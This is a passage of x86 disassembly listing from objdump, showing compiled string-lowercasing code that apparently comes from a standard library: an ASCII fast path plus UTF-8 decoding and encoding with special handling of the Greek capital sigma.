  40165f:	c0 ed 07             	shr    $0x7,%ch
  401662:	c0 e9 07             	shr    $0x7,%cl
  401665:	00 e9                	add    %ch,%cl
  401667:	88 fd                	mov    %bh,%ch
  401669:	f6 d5                	not    %ch
  40166b:	c0 ed 07             	shr    $0x7,%ch
  40166e:	00 eb                	add    %ch,%bl
  401670:	8a 6c 06 05          	mov    0x5(%esi,%eax,1),%ch
  401674:	00 cb                	add    %cl,%bl
  401676:	8a 4c 06 04          	mov    0x4(%esi,%eax,1),%cl
  40167a:	88 6d b5             	mov    %ch,-0x4b(%ebp)
  40167d:	f6 d5                	not    %ch
  40167f:	88 4d b7             	mov    %cl,-0x49(%ebp)
  401682:	f6 d1                	not    %cl
  401684:	c0 ed 07             	shr    $0x7,%ch
  401687:	c0 e9 07             	shr    $0x7,%cl
  40168a:	00 cd                	add    %cl,%ch
  40168c:	8a 4c 06 06          	mov    0x6(%esi,%eax,1),%cl
  401690:	88 4d b3             	mov    %cl,-0x4d(%ebp)
  401693:	f6 d1                	not    %cl
  401695:	c0 e9 07             	shr    $0x7,%cl
  401698:	00 e9                	add    %ch,%cl
  40169a:	8a 6c 06 07          	mov    0x7(%esi,%eax,1),%ch
  40169e:	00 d9                	add    %bl,%cl
  4016a0:	8a 5c 06 08          	mov    0x8(%esi,%eax,1),%bl
  4016a4:	88 6d b4             	mov    %ch,-0x4c(%ebp)
  4016a7:	f6 d5                	not    %ch
  4016a9:	88 5d b2             	mov    %bl,-0x4e(%ebp)
  4016ac:	f6 d3                	not    %bl
  4016ae:	c0 ed 07             	shr    $0x7,%ch
  4016b1:	c0 eb 07             	shr    $0x7,%bl
  4016b4:	00 eb                	add    %ch,%bl
  4016b6:	8a 6c 06 09          	mov    0x9(%esi,%eax,1),%ch
  4016ba:	88 6d a8             	mov    %ch,-0x58(%ebp)
  4016bd:	f6 d5                	not    %ch
  4016bf:	c0 ed 07             	shr    $0x7,%ch
  4016c2:	00 dd                	add    %bl,%ch
  4016c4:	8a 5c 06 0a          	mov    0xa(%esi,%eax,1),%bl
  4016c8:	88 5d cc             	mov    %bl,-0x34(%ebp)
  4016cb:	f6 d3                	not    %bl
  4016cd:	c0 eb 07             	shr    $0x7,%bl
  4016d0:	00 eb                	add    %ch,%bl
  4016d2:	8a 6c 06 0c          	mov    0xc(%esi,%eax,1),%ch
  4016d6:	00 cb                	add    %cl,%bl
  4016d8:	8a 4c 06 0b          	mov    0xb(%esi,%eax,1),%cl
  4016dc:	88 6d d8             	mov    %ch,-0x28(%ebp)
  4016df:	f6 d5                	not    %ch
  4016e1:	88 4d c8             	mov    %cl,-0x38(%ebp)
  4016e4:	f6 d1                	not    %cl
  4016e6:	c0 ed 07             	shr    $0x7,%ch
  4016e9:	c0 e9 07             	shr    $0x7,%cl
  4016ec:	00 cd                	add    %cl,%ch
  4016ee:	8a 4c 06 0d          	mov    0xd(%esi,%eax,1),%cl
  4016f2:	88 4d d4             	mov    %cl,-0x2c(%ebp)
  4016f5:	f6 d1                	not    %cl
  4016f7:	c0 e9 07             	shr    $0x7,%cl
  4016fa:	00 e9                	add    %ch,%cl
  4016fc:	8a 6c 06 0e          	mov    0xe(%esi,%eax,1),%ch
  401700:	88 6d dc             	mov    %ch,-0x24(%ebp)
  401703:	f6 d5                	not    %ch
  401705:	c0 ed 07             	shr    $0x7,%ch
  401708:	00 cd                	add    %cl,%ch
  40170a:	8a 4c 06 0f          	mov    0xf(%esi,%eax,1),%cl
  40170e:	88 4d d0             	mov    %cl,-0x30(%ebp)
  401711:	f6 d1                	not    %cl
  401713:	c0 e9 07             	shr    $0x7,%cl
  401716:	00 e9                	add    %ch,%cl
  401718:	00 d9                	add    %bl,%cl
  40171a:	80 f9 10             	cmp    $0x10,%cl
  40171d:	0f 85 a8 01 00 00    	jne    0x4018cb
  401723:	88 f1                	mov    %dh,%cl
  401725:	80 c1 bf             	add    $0xbf,%cl
  401728:	80 f9 1a             	cmp    $0x1a,%cl
  40172b:	0f 92 c1             	setb   %cl
  40172e:	c0 e1 05             	shl    $0x5,%cl
  401731:	08 f1                	or     %dh,%cl
  401733:	88 0c 07             	mov    %cl,(%edi,%eax,1)
  401736:	89 d1                	mov    %edx,%ecx
  401738:	80 c1 bf             	add    $0xbf,%cl
  40173b:	80 f9 1a             	cmp    $0x1a,%cl
  40173e:	0f 92 c1             	setb   %cl
  401741:	c0 e1 05             	shl    $0x5,%cl
  401744:	08 d1                	or     %dl,%cl
  401746:	0f b6 55 b6          	movzbl -0x4a(%ebp),%edx
  40174a:	88 4c 07 01          	mov    %cl,0x1(%edi,%eax,1)
  40174e:	88 f9                	mov    %bh,%cl
  401750:	80 c1 bf             	add    $0xbf,%cl
  401753:	80 f9 1a             	cmp    $0x1a,%cl
  401756:	0f 92 c1             	setb   %cl
  401759:	c0 e1 05             	shl    $0x5,%cl
  40175c:	08 f9                	or     %bh,%cl
  40175e:	88 4c 07 02          	mov    %cl,0x2(%edi,%eax,1)
  401762:	89 d1                	mov    %edx,%ecx
  401764:	80 c1 bf             	add    $0xbf,%cl
  401767:	80 f9 1a             	cmp    $0x1a,%cl
  40176a:	0f 92 c1             	setb   %cl
  40176d:	c0 e1 05             	shl    $0x5,%cl
  401770:	08 d1                	or     %dl,%cl
  401772:	0f b6 55 b7          	movzbl -0x49(%ebp),%edx
  401776:	88 4c 07 03          	mov    %cl,0x3(%edi,%eax,1)
  40177a:	89 d1                	mov    %edx,%ecx
  40177c:	80 c1 bf             	add    $0xbf,%cl
  40177f:	80 f9 1a             	cmp    $0x1a,%cl
  401782:	0f 92 c1             	setb   %cl
  401785:	c0 e1 05             	shl    $0x5,%cl
  401788:	08 d1                	or     %dl,%cl
  40178a:	0f b6 55 b5          	movzbl -0x4b(%ebp),%edx
  40178e:	88 4c 07 04          	mov    %cl,0x4(%edi,%eax,1)
  401792:	89 d1                	mov    %edx,%ecx
  401794:	80 c1 bf             	add    $0xbf,%cl
  401797:	80 f9 1a             	cmp    $0x1a,%cl
  40179a:	0f 92 c1             	setb   %cl
  40179d:	c0 e1 05             	shl    $0x5,%cl
  4017a0:	08 d1                	or     %dl,%cl
  4017a2:	0f b6 55 b3          	movzbl -0x4d(%ebp),%edx
  4017a6:	88 4c 07 05          	mov    %cl,0x5(%edi,%eax,1)
  4017aa:	89 d1                	mov    %edx,%ecx
  4017ac:	80 c1 bf             	add    $0xbf,%cl
  4017af:	80 f9 1a             	cmp    $0x1a,%cl
  4017b2:	0f 92 c1             	setb   %cl
  4017b5:	c0 e1 05             	shl    $0x5,%cl
  4017b8:	08 d1                	or     %dl,%cl
  4017ba:	0f b6 55 b4          	movzbl -0x4c(%ebp),%edx
  4017be:	88 4c 07 06          	mov    %cl,0x6(%edi,%eax,1)
  4017c2:	89 d1                	mov    %edx,%ecx
  4017c4:	80 c1 bf             	add    $0xbf,%cl
  4017c7:	80 f9 1a             	cmp    $0x1a,%cl
  4017ca:	0f 92 c1             	setb   %cl
  4017cd:	c0 e1 05             	shl    $0x5,%cl
  4017d0:	08 d1                	or     %dl,%cl
  4017d2:	0f b6 55 b2          	movzbl -0x4e(%ebp),%edx
  4017d6:	88 4c 07 07          	mov    %cl,0x7(%edi,%eax,1)
  4017da:	89 d1                	mov    %edx,%ecx
  4017dc:	80 c1 bf             	add    $0xbf,%cl
  4017df:	80 f9 1a             	cmp    $0x1a,%cl
  4017e2:	0f 92 c1             	setb   %cl
  4017e5:	c0 e1 05             	shl    $0x5,%cl
  4017e8:	08 d1                	or     %dl,%cl
  4017ea:	0f b6 55 a8          	movzbl -0x58(%ebp),%edx
  4017ee:	88 4c 07 08          	mov    %cl,0x8(%edi,%eax,1)
  4017f2:	89 d1                	mov    %edx,%ecx
  4017f4:	80 c1 bf             	add    $0xbf,%cl
  4017f7:	80 f9 1a             	cmp    $0x1a,%cl
  4017fa:	0f 92 c1             	setb   %cl
  4017fd:	c0 e1 05             	shl    $0x5,%cl
  401800:	08 d1                	or     %dl,%cl
  401802:	0f b6 55 cc          	movzbl -0x34(%ebp),%edx
  401806:	88 4c 07 09          	mov    %cl,0x9(%edi,%eax,1)
  40180a:	89 d1                	mov    %edx,%ecx
  40180c:	80 c1 bf             	add    $0xbf,%cl
  40180f:	80 f9 1a             	cmp    $0x1a,%cl
  401812:	0f 92 c1             	setb   %cl
  401815:	c0 e1 05             	shl    $0x5,%cl
  401818:	08 d1                	or     %dl,%cl
  40181a:	0f b6 55 c8          	movzbl -0x38(%ebp),%edx
  40181e:	88 4c 07 0a          	mov    %cl,0xa(%edi,%eax,1)
  401822:	89 d1                	mov    %edx,%ecx
  401824:	80 c1 bf             	add    $0xbf,%cl
  401827:	80 f9 1a             	cmp    $0x1a,%cl
  40182a:	0f 92 c1             	setb   %cl
  40182d:	c0 e1 05             	shl    $0x5,%cl
  401830:	08 d1                	or     %dl,%cl
  401832:	0f b6 55 d8          	movzbl -0x28(%ebp),%edx
  401836:	88 4c 07 0b          	mov    %cl,0xb(%edi,%eax,1)
  40183a:	89 d1                	mov    %edx,%ecx
  40183c:	80 c1 bf             	add    $0xbf,%cl
  40183f:	80 f9 1a             	cmp    $0x1a,%cl
  401842:	0f 92 c1             	setb   %cl
  401845:	c0 e1 05             	shl    $0x5,%cl
  401848:	08 d1                	or     %dl,%cl
  40184a:	0f b6 55 d4          	movzbl -0x2c(%ebp),%edx
  40184e:	88 4c 07 0c          	mov    %cl,0xc(%edi,%eax,1)
  401852:	89 d1                	mov    %edx,%ecx
  401854:	80 c1 bf             	add    $0xbf,%cl
  401857:	80 f9 1a             	cmp    $0x1a,%cl
  40185a:	0f 92 c1             	setb   %cl
  40185d:	c0 e1 05             	shl    $0x5,%cl
  401860:	08 d1                	or     %dl,%cl
  401862:	0f b6 55 dc          	movzbl -0x24(%ebp),%edx
  401866:	88 4c 07 0d          	mov    %cl,0xd(%edi,%eax,1)
  40186a:	89 d1                	mov    %edx,%ecx
  40186c:	80 c1 bf             	add    $0xbf,%cl
  40186f:	80 f9 1a             	cmp    $0x1a,%cl
  401872:	0f 92 c1             	setb   %cl
  401875:	c0 e1 05             	shl    $0x5,%cl
  401878:	08 d1                	or     %dl,%cl
  40187a:	0f b6 55 d0          	movzbl -0x30(%ebp),%edx
  40187e:	88 4c 07 0e          	mov    %cl,0xe(%edi,%eax,1)
  401882:	89 d1                	mov    %edx,%ecx
  401884:	80 c1 bf             	add    $0xbf,%cl
  401887:	80 f9 1a             	cmp    $0x1a,%cl
  40188a:	0f 92 c1             	setb   %cl
  40188d:	c0 e1 05             	shl    $0x5,%cl
  401890:	08 d1                	or     %dl,%cl
  401892:	8b 55 b8             	mov    -0x48(%ebp),%edx
  401895:	88 4c 07 0f          	mov    %cl,0xf(%edi,%eax,1)
  401899:	83 c0 10             	add    $0x10,%eax
  40189c:	83 c2 f0             	add    $0xfffffff0,%edx
  40189f:	83 fa 0f             	cmp    $0xf,%edx
  4018a2:	89 55 b8             	mov    %edx,-0x48(%ebp)
  4018a5:	0f 87 95 fd ff ff    	ja     0x401640
  4018ab:	83 7d b8 00          	cmpl   $0x0,-0x48(%ebp)
  4018af:	8d 1c 06             	lea    (%esi,%eax,1),%ebx
  4018b2:	74 4b                	je     0x4018ff
  4018b4:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  4018b7:	01 c1                	add    %eax,%ecx
  4018b9:	8b 45 ac             	mov    -0x54(%ebp),%eax
  4018bc:	eb 15                	jmp    0x4018d3
  4018be:	ba 01 00 00 00       	mov    $0x1,%edx
  4018c3:	89 f3                	mov    %esi,%ebx
  4018c5:	31 ff                	xor    %edi,%edi
  4018c7:	31 c0                	xor    %eax,%eax
  4018c9:	eb 3c                	jmp    0x401907
  4018cb:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  4018ce:	8d 1c 06             	lea    (%esi,%eax,1),%ebx
  4018d1:	01 c1                	add    %eax,%ecx
  4018d3:	8b 55 b8             	mov    -0x48(%ebp),%edx
  4018d6:	89 d7                	mov    %edx,%edi
  4018d8:	01 c2                	add    %eax,%edx
  4018da:	89 55 ac             	mov    %edx,-0x54(%ebp)
  4018dd:	0f 1f 00             	nopl   (%eax)
  4018e0:	0f b6 13             	movzbl (%ebx),%edx
  4018e3:	84 d2                	test   %dl,%dl
  4018e5:	78 1d                	js     0x401904
  4018e7:	88 d6                	mov    %dl,%dh
  4018e9:	80 c6 bf             	add    $0xbf,%dh
  4018ec:	80 fe 1a             	cmp    $0x1a,%dh
  4018ef:	0f 92 c6             	setb   %dh
  4018f2:	40                   	inc    %eax
  4018f3:	43                   	inc    %ebx
  4018f4:	c0 e6 05             	shl    $0x5,%dh
  4018f7:	08 d6                	or     %dl,%dh
  4018f9:	88 31                	mov    %dh,(%ecx)
  4018fb:	41                   	inc    %ecx
  4018fc:	4f                   	dec    %edi
  4018fd:	75 e1                	jne    0x4018e0
  4018ff:	8b 45 ac             	mov    -0x54(%ebp),%eax
  401902:	31 ff                	xor    %edi,%edi
  401904:	8b 55 e0             	mov    -0x20(%ebp),%edx
  401907:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40190a:	01 df                	add    %ebx,%edi
  40190c:	89 45 ac             	mov    %eax,-0x54(%ebp)
  40190f:	89 7d b8             	mov    %edi,-0x48(%ebp)
  401912:	31 ff                	xor    %edi,%edi
  401914:	89 4d bc             	mov    %ecx,-0x44(%ebp)
  401917:	01 f1                	add    %esi,%ecx
  401919:	89 d6                	mov    %edx,%esi
  40191b:	89 55 c0             	mov    %edx,-0x40(%ebp)
  40191e:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  401921:	89 4d a8             	mov    %ecx,-0x58(%ebp)
  401924:	89 c1                	mov    %eax,%ecx
  401926:	eb 09                	jmp    0x401931
  401928:	88 14 06             	mov    %dl,(%esi,%eax,1)
  40192b:	03 4d d8             	add    -0x28(%ebp),%ecx
  40192e:	89 4d c4             	mov    %ecx,-0x3c(%ebp)
  401931:	3b 5d b8             	cmp    -0x48(%ebp),%ebx
  401934:	0f 84 9f 0a 00 00    	je     0x4023d9
  40193a:	0f b6 13             	movzbl (%ebx),%edx
  40193d:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  401940:	89 75 e0             	mov    %esi,-0x20(%ebp)
  401943:	0f b6 c2             	movzbl %dl,%eax
  401946:	84 d2                	test   %dl,%dl
  401948:	78 26                	js     0x401970
  40194a:	29 df                	sub    %ebx,%edi
  40194c:	43                   	inc    %ebx
  40194d:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  401954:	01 df                	add    %ebx,%edi
  401956:	89 5d d4             	mov    %ebx,-0x2c(%ebp)
  401959:	89 7d d0             	mov    %edi,-0x30(%ebp)
  40195c:	e9 98 00 00 00       	jmp    0x4019f9
  401961:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  401968:	00 00 00 
  40196b:	0f 1f 44 00 00       	nopl   0x0(%eax,%eax,1)
  401970:	0f b6 73 01          	movzbl 0x1(%ebx),%esi
  401974:	83 e0 1f             	and    $0x1f,%eax
  401977:	83 e6 3f             	and    $0x3f,%esi
  40197a:	80 fa df             	cmp    $0xdf,%dl
  40197d:	76 2c                	jbe    0x4019ab
  40197f:	0f b6 4b 02          	movzbl 0x2(%ebx),%ecx
  401983:	c1 e6 06             	shl    $0x6,%esi
  401986:	83 e1 3f             	and    $0x3f,%ecx
  401989:	09 f1                	or     %esi,%ecx
  40198b:	80 fa f0             	cmp    $0xf0,%dl
  40198e:	72 25                	jb     0x4019b5
  401990:	0f b6 53 03          	movzbl 0x3(%ebx),%edx
  401994:	83 e0 07             	and    $0x7,%eax
  401997:	c1 e1 06             	shl    $0x6,%ecx
  40199a:	8d 73 04             	lea    0x4(%ebx),%esi
  40199d:	c1 e0 12             	shl    $0x12,%eax
  4019a0:	83 e2 3f             	and    $0x3f,%edx
  4019a3:	09 ca                	or     %ecx,%edx
  4019a5:	89 f1                	mov    %esi,%ecx
  4019a7:	09 d0                	or     %edx,%eax
  4019a9:	eb 14                	jmp    0x4019bf
  4019ab:	c1 e0 06             	shl    $0x6,%eax
  4019ae:	8d 4b 02             	lea    0x2(%ebx),%ecx
  4019b1:	09 f0                	or     %esi,%eax
  4019b3:	eb 0a                	jmp    0x4019bf
  4019b5:	c1 e0 0c             	shl    $0xc,%eax
  4019b8:	8d 53 03             	lea    0x3(%ebx),%edx
  4019bb:	09 c8                	or     %ecx,%eax
  4019bd:	89 d1                	mov    %edx,%ecx
  4019bf:	8b 75 0c             	mov    0xc(%ebp),%esi
  4019c2:	89 fa                	mov    %edi,%edx
  4019c4:	29 da                	sub    %ebx,%edx
  4019c6:	01 ca                	add    %ecx,%edx
  4019c8:	3d a3 03 00 00       	cmp    $0x3a3,%eax
  4019cd:	75 24                	jne    0x4019f3
  4019cf:	03 7d ac             	add    -0x54(%ebp),%edi
  4019d2:	89 55 d8             	mov    %edx,-0x28(%ebp)
  4019d5:	0f 84 e6 01 00 00    	je     0x401bc1
  4019db:	3b 7d 10             	cmp    0x10(%ebp),%edi
  4019de:	0f 83 d7 01 00 00    	jae    0x401bbb
  4019e4:	80 3c 3e c0          	cmpb   $0xc0,(%esi,%edi,1)
  4019e8:	0f 8d d3 01 00 00    	jge    0x401bc1
  4019ee:	e9 0a 0a 00 00       	jmp    0x4023fd
  4019f3:	89 55 d0             	mov    %edx,-0x30(%ebp)
  4019f6:	89 4d d4             	mov    %ecx,-0x2c(%ebp)
  4019f9:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  401a00:	50                   	push   %eax
  401a01:	8d 45 9c             	lea    -0x64(%ebp),%eax
  401a04:	50                   	push   %eax
  401a05:	e8 76 41 00 00       	call   0x405b80
  401a0a:	83 c4 08             	add    $0x8,%esp
  401a0d:	8b 45 a0             	mov    -0x60(%ebp),%eax
  401a10:	8b 75 e0             	mov    -0x20(%ebp),%esi
  401a13:	85 c0                	test   %eax,%eax
  401a15:	74 79                	je     0x401a90
  401a17:	8b 55 a4             	mov    -0x5c(%ebp),%edx
  401a1a:	8b 4d 9c             	mov    -0x64(%ebp),%ecx
  401a1d:	8b 7d dc             	mov    -0x24(%ebp),%edi
  401a20:	8b 5d d4             	mov    -0x2c(%ebp),%ebx
  401a23:	89 45 cc             	mov    %eax,-0x34(%ebp)
  401a26:	85 d2                	test   %edx,%edx
  401a28:	89 55 c8             	mov    %edx,-0x38(%ebp)
  401a2b:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  401a2e:	0f 84 b8 00 00 00    	je     0x401aec
  401a34:	81 f9 80 00 00 00    	cmp    $0x80,%ecx
  401a3a:	89 c8                	mov    %ecx,%eax
  401a3c:	b9 01 00 00 00       	mov    $0x1,%ecx
  401a41:	72 19                	jb     0x401a5c
  401a43:	b9 02 00 00 00       	mov    $0x2,%ecx
  401a48:	3d 00 08 00 00       	cmp    $0x800,%eax
  401a4d:	72 0d                	jb     0x401a5c
  401a4f:	3d 00 00 01 00       	cmp    $0x10000,%eax
  401a54:	b9 04 00 00 00       	mov    $0x4,%ecx
  401a59:	83 d9 00             	sbb    $0x0,%ecx
  401a5c:	8b 45 bc             	mov    -0x44(%ebp),%eax
  401a5f:	29 f8                	sub    %edi,%eax
  401a61:	39 c1                	cmp    %eax,%ecx
  401a63:	89 f8                	mov    %edi,%eax
  401a65:	0f 87 b3 07 00 00    	ja     0x40221e
  401a6b:	8b 55 d8             	mov    -0x28(%ebp),%edx
  401a6e:	81 fa 80 00 00 00    	cmp    $0x80,%edx
  401a74:	0f 83 bb 00 00 00    	jae    0x401b35
  401a7a:	89 5d d4             	mov    %ebx,-0x2c(%ebp)
  401a7d:	88 14 06             	mov    %dl,(%esi,%eax,1)
  401a80:	e9 f0 02 00 00       	jmp    0x401d75
  401a85:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  401a8c:	00 00 00 
  401a8f:	90                   	nop
  401a90:	8b 55 9c             	mov    -0x64(%ebp),%edx
  401a93:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  401a96:	8b 5d d4             	mov    -0x2c(%ebp),%ebx
  401a99:	bf 01 00 00 00       	mov    $0x1,%edi
  401a9e:	81 fa 80 00 00 00    	cmp    $0x80,%edx
  401aa4:	72 1b                	jb     0x401ac1
  401aa6:	bf 02 00 00 00       	mov    $0x2,%edi
  401aab:	81 fa 00 08 00 00    	cmp    $0x800,%edx
  401ab1:	72 0e                	jb     0x401ac1
  401ab3:	81 fa 00 00 01 00    	cmp    $0x10000,%edx
  401ab9:	bf 04 00 00 00       	mov    $0x4,%edi
  401abe:	83 df 00             	sbb    $0x0,%edi
  401ac1:	8b 45 bc             	mov    -0x44(%ebp),%eax
  401ac4:	29 c8                	sub    %ecx,%eax
  401ac6:	39 c7                	cmp    %eax,%edi
  401ac8:	89 c8                	mov    %ecx,%eax
  401aca:	0f 87 d0 07 00 00    	ja     0x4022a0
  401ad0:	81 fa 80 00 00 00    	cmp    $0x80,%edx
  401ad6:	0f 83 f6 07 00 00    	jae    0x4022d2
  401adc:	01 f9                	add    %edi,%ecx
  401ade:	8b 7d d0             	mov    -0x30(%ebp),%edi
  401ae1:	88 14 06             	mov    %dl,(%esi,%eax,1)
  401ae4:	89 4d c4             	mov    %ecx,-0x3c(%ebp)
  401ae7:	e9 45 fe ff ff       	jmp    0x401931
  401aec:	81 f9 80 00 00 00    	cmp    $0x80,%ecx
  401af2:	89 c8                	mov    %ecx,%eax
  401af4:	b9 01 00 00 00       	mov    $0x1,%ecx
  401af9:	72 19                	jb     0x401b14
  401afb:	b9 02 00 00 00       	mov    $0x2,%ecx
  401b00:	3d 00 08 00 00       	cmp    $0x800,%eax
  401b05:	72 0d                	jb     0x401b14
  401b07:	3d 00 00 01 00       	cmp    $0x10000,%eax
  401b0c:	b9 04 00 00 00       	mov    $0x4,%ecx
  401b11:	83 d9 00             	sbb    $0x0,%ecx
  401b14:	8b 45 bc             	mov    -0x44(%ebp),%eax
  401b17:	89 fa                	mov    %edi,%edx
  401b19:	29 f8                	sub    %edi,%eax
  401b1b:	39 c1                	cmp    %eax,%ecx
  401b1d:	0f 87 3d 08 00 00    	ja     0x402360
  401b23:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401b26:	3d 80 00 00 00       	cmp    $0x80,%eax
  401b2b:	73 33                	jae    0x401b60
  401b2d:	88 04 16             	mov    %al,(%esi,%edx,1)
  401b30:	e9 54 04 00 00       	jmp    0x401f89
  401b35:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  401b38:	89 d1                	mov    %edx,%ecx
  401b3a:	89 c7                	mov    %eax,%edi
  401b3c:	89 d0                	mov    %edx,%eax
  401b3e:	80 e1 3f             	and    $0x3f,%cl
  401b41:	c1 e8 06             	shr    $0x6,%eax
  401b44:	80 c9 80             	or     $0x80,%cl
  401b47:	81 fa 00 08 00 00    	cmp    $0x800,%edx
  401b4d:	73 44                	jae    0x401b93
  401b4f:	0c c0                	or     $0xc0,%al
  401b51:	89 5d d4             	mov    %ebx,-0x2c(%ebp)
  401b54:	88 04 3e             	mov    %al,(%esi,%edi,1)
  401b57:	88 4c 3e 01          	mov    %cl,0x1(%esi,%edi,1)
  401b5b:	e9 0f 02 00 00       	jmp    0x401d6f
  401b60:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  401b63:	89 c1                	mov    %eax,%ecx
  401b65:	89 55 c8             	mov    %edx,-0x38(%ebp)
  401b68:	89 c2                	mov    %eax,%edx
  401b6a:	80 e1 3f             	and    $0x3f,%cl
  401b6d:	c1 ea 06             	shr    $0x6,%edx
  401b70:	80 c9 80             	or     $0x80,%cl
  401b73:	3d 00 08 00 00       	cmp    $0x800,%eax
  401b78:	0f 83 aa 01 00 00    	jae    0x401d28
  401b7e:	8b 45 c8             	mov    -0x38(%ebp),%eax
  401b81:	80 ca c0             	or     $0xc0,%dl
  401b84:	8b 7d dc             	mov    -0x24(%ebp),%edi
  401b87:	88 14 06             	mov    %dl,(%esi,%eax,1)
  401b8a:	88 4c 06 01          	mov    %cl,0x1(%esi,%eax,1)
  401b8e:	e9 f3 03 00 00       	jmp    0x401f86
  401b93:	24 3f                	and    $0x3f,%al
  401b95:	89 d3                	mov    %edx,%ebx
  401b97:	0c 80                	or     $0x80,%al
  401b99:	c1 eb 0c             	shr    $0xc,%ebx
  401b9c:	81 fa ff ff 00 00    	cmp    $0xffff,%edx
  401ba2:	0f 87 ac 01 00 00    	ja     0x401d54
  401ba8:	80 cb e0             	or     $0xe0,%bl
  401bab:	88 1c 3e             	mov    %bl,(%esi,%edi,1)
  401bae:	88 44 3e 01          	mov    %al,0x1(%esi,%edi,1)
  401bb2:	88 4c 3e 02          	mov    %cl,0x2(%esi,%edi,1)
  401bb6:	e9 b4 01 00 00       	jmp    0x401d6f
  401bbb:	0f 85 3c 08 00 00    	jne    0x4023fd
  401bc1:	8d 14 3e             	lea    (%esi,%edi,1),%edx
  401bc4:	31 c0                	xor    %eax,%eax
  401bc6:	89 4d cc             	mov    %ecx,-0x34(%ebp)
  401bc9:	89 7d d0             	mov    %edi,-0x30(%ebp)
  401bcc:	eb 13                	jmp    0x401be1
  401bce:	66 90                	xchg   %ax,%ax
  401bd0:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  401bd3:	b0 01                	mov    $0x1,%al
  401bd5:	81 f9 00 00 11 00    	cmp    $0x110000,%ecx
  401bdb:	0f 85 27 01 00 00    	jne    0x401d08
  401be1:	b7 83                	mov    $0x83,%bh
  401be3:	39 d6                	cmp    %edx,%esi
  401be5:	0f 84 b8 05 00 00    	je     0x4021a3
  401beb:	0f be 4a ff          	movsbl -0x1(%edx),%ecx
  401bef:	85 c9                	test   %ecx,%ecx
  401bf1:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  401bf4:	78 0a                	js     0x401c00
  401bf6:	4a                   	dec    %edx
  401bf7:	eb 75                	jmp    0x401c6e
  401bf9:	0f 1f 80 00 00 00 00 	nopl   0x0(%eax)
  401c00:	0f b6 4a fe          	movzbl -0x2(%edx),%ecx
  401c04:	80 f9 c0             	cmp    $0xc0,%cl
  401c07:	7d 22                	jge    0x401c2b
  401c09:	89 d7                	mov    %edx,%edi
  401c0b:	0f b6 52 fd          	movzbl -0x3(%edx),%edx
  401c0f:	80 fa bf             	cmp    $0xbf,%dl
  401c12:	7f 21                	jg     0x401c35
  401c14:	0f b6 77 fc          	movzbl -0x4(%edi),%esi
  401c18:	83 e2 3f             	and    $0x3f,%edx
  401c1b:	83 c7 fc             	add    $0xfffffffc,%edi
  401c1e:	89 7d d4             	mov    %edi,-0x2c(%ebp)
  401c21:	83 e6 07             	and    $0x7,%esi
  401c24:	c1 e6 06             	shl    $0x6,%esi
  401c27:	09 f2                	or     %esi,%edx
  401c29:	eb 13                	jmp    0x401c3e
  401c2b:	89 c6                	mov    %eax,%esi
  401c2d:	83 c2 fe             	add    $0xfffffffe,%edx
  401c30:	83 e1 1f             	and    $0x1f,%ecx
  401c33:	eb 19                	jmp    0x401c4e
  401c35:	83 c7 fd             	add    $0xfffffffd,%edi
  401c38:	83 e2 0f             	and    $0xf,%edx
  401c3b:	89 7d d4             	mov    %edi,-0x2c(%ebp)
  401c3e:	c1 e2 06             	shl    $0x6,%edx
  401c41:	83 e1 3f             	and    $0x3f,%ecx
  401c44:	8b 7d d0             	mov    -0x30(%ebp),%edi
  401c47:	89 c6                	mov    %eax,%esi
  401c49:	09 d1                	or     %edx,%ecx
  401c4b:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  401c4e:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401c51:	c1 e1 06             	shl    $0x6,%ecx
  401c54:	24 3f                	and    $0x3f,%al
  401c56:	0f b6 c0             	movzbl %al,%eax
  401c59:	09 c8                	or     %ecx,%eax
  401c5b:	89 45 e0             	mov    %eax,-0x20(%ebp)
  401c5e:	3d 00 00 11 00       	cmp    $0x110000,%eax
  401c63:	89 f0                	mov    %esi,%eax
  401c65:	8b 75 0c             	mov    0xc(%ebp),%esi
  401c68:	0f 84 35 05 00 00    	je     0x4021a3
  401c6e:	a8 01                	test   $0x1,%al
  401c70:	0f 85 5a ff ff ff    	jne    0x401bd0
  401c76:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401c79:	3d 80 00 00 00       	cmp    $0x80,%eax
  401c7e:	73 40                	jae    0x401cc0
  401c80:	89 fe                	mov    %edi,%esi
  401c82:	89 d7                	mov    %edx,%edi
  401c84:	8d 50 d9             	lea    -0x27(%eax),%edx
  401c87:	b9 00 00 11 00       	mov    $0x110000,%ecx
  401c8c:	83 fa 13             	cmp    $0x13,%edx
  401c8f:	77 0c                	ja     0x401c9d
  401c91:	bb 81 00 08 00       	mov    $0x80081,%ebx
  401c96:	0f a3 d3             	bt     %edx,%ebx
  401c99:	b7 83                	mov    $0x83,%bh
  401c9b:	72 5d                	jb     0x401cfa
  401c9d:	8b 55 e0             	mov    -0x20(%ebp),%edx
  401ca0:	83 fa 5e             	cmp    $0x5e,%edx
  401ca3:	74 55                	je     0x401cfa
  401ca5:	83 fa 60             	cmp    $0x60,%edx
  401ca8:	89 fa                	mov    %edi,%edx
  401caa:	89 f7                	mov    %esi,%edi
  401cac:	8b 75 0c             	mov    0xc(%ebp),%esi
  401caf:	b8 00 00 00 00       	mov    $0x0,%eax
  401cb4:	0f 85 16 ff ff ff    	jne    0x401bd0
  401cba:	e9 16 ff ff ff       	jmp    0x401bd5
  401cbf:	90                   	nop
  401cc0:	3d a7 00 00 00       	cmp    $0xa7,%eax
  401cc5:	0f 86 05 ff ff ff    	jbe    0x401bd0
  401ccb:	89 55 d4             	mov    %edx,-0x2c(%ebp)
